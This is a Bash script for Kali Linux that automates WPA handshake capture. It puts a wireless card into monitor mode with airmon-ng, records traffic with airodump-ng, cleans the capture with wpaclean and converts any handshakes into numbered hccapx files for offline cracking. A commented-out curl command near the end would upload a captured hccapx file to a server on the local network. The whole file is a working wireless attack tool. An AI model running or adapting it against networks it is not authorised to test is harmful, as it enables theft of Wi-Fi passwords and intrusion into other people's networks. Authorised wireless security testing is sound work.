#!/bin/bash

checkHandshakes(){
	echo ""
	echo "Clean cap file.."
	output=`wpaclean /home/kali/cleanshakes.cap /home/kali/shakes-01.cap` #> /dev/null`
	echo $output
	if [[ "$output" == *"Net"* ]]; then
		echo "Handshakes detected!!!"
		if [[ -d /home/kali/shakes ]]
		then

			if [[ `ls /home/kali/shakes/ | wc -l` -ne 0 ]]; then
				lastNum=$(($(head -n 1 /home/kali/shakes/.counter)+1))
				aircrack-ng -j /home/kali/shakes/shake${lastNum} /home/kali/cleanshakes.cap > /dev/null
				echo $lastNum > /home/kali/shakes/.counter
			else
				mkdir /home/kali/shakes/
				aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
				touch /home/kali/shakes/.counter
				echo "1" > /home/kali/shakes/.counter
			fi
		else
			mkdir /home/kali/shakes
			aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
			touch /home/kali/shakes/.counter
			echo "1" > /home/kali/shakes/.counter
		fi
		rm /home/kali/cleanshakes.cap

	else
		echo "No handshakes"
	fi
	rm /home/kali/shakes-*
}

main(){

	trap 'checkHandshakes' EXIT

	airmon-ng check kill
	airmon-ng start wlan1

	echo "Start airodump.."
	airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null   
	
	
  	#curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
}




main 
